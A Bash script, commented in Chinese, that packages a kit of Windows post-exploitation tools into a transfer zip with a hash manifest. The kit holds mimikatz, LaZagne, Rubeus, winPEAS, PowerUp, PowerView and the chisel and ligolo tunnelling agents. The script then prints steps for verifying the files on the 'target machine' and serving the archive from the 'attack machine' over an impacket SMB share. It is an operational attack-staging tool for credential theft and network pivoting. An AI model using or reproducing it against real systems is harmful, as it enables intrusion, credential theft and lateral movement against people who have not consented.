#!/usr/bin/env bash
# make-stage.sh — 打包 Windows 落地件为传输用 zip(附 SHA256 清单)
# 用法: make-stage.sh [输出目录,默认 /tmp]
set -euo pipefail
OUT="${1:-/tmp}/stage-$(date +%Y%m%d-%H%M)"
SRC="$HOME/tools/windows"
[ -d "$SRC" ] || { echo "缺 $SRC"; exit 1; }
mkdir -p "$OUT"
cd "$SRC"
FILES=(mimikatz/x64/mimikatz.exe mimikatz/x64/mimilib.dll chisel.exe ligolo_agent.exe winPEASx64.exe Rubeus.exe LaZagne.exe ruler.exe)
# 逐个复制并核对落盘:缺件必须报出来,不能静默出"缺斤短两"的包
MISSING=()
for f in "${FILES[@]}"; do
    cp --parents "$f" "$OUT/" 2>/dev/null || MISSING+=("$f")
done
for f in Recon/PowerView.ps1 Privesc/PowerUp.ps1; do
    cp "$HOME/tools/src/PowerSploit/$f" "$OUT/" 2>/dev/null || MISSING+=("PowerSploit/$f")
done
if [ "${#MISSING[@]}" -gt 0 ]; then
    echo "[!] 缺失落地件: ${MISSING[*]}" >&2
    exit 1
fi
find "$OUT" -type f -exec sha256sum {} \; | sed "s|$OUT/||" > "$OUT/SHA256SUMS.txt"
(cd "$OUT" && zip -q -r "${OUT}.zip" .) && rm -rf "$OUT"
echo "打包完成: ${OUT}.zip"; unzip -l "${OUT}.zip" | tail -3
echo "目标机解压后校验: certutil -hashfile SHA256SUMS.txt SHA256 或逐个比对"
echo "传输(攻击机起 SMB): sudo impacket-smbserver share $(dirname "${OUT}.zip") -smb2support"
